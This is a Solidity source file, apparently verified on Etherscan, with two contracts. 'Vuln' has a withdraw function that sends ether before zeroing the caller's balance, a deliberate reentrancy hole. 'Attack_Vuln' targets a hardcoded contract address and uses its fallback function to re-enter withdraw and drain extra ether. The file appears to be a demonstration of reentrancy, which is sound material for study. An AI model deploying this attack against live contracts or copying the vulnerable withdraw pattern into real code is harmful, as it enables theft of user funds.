/**
 *Submitted for verification at Etherscan.io on 2021-12-06
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}




contract Attack_Vuln {
    Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));

    function attack() public payable {
        v.deposit { value: 0.1 ether } ( );
        v.withdraw();
    }

    bool count = false;
    fallback() external payable {
        if (count == false) {
            count = true;
            v.withdraw();
        }
    }

}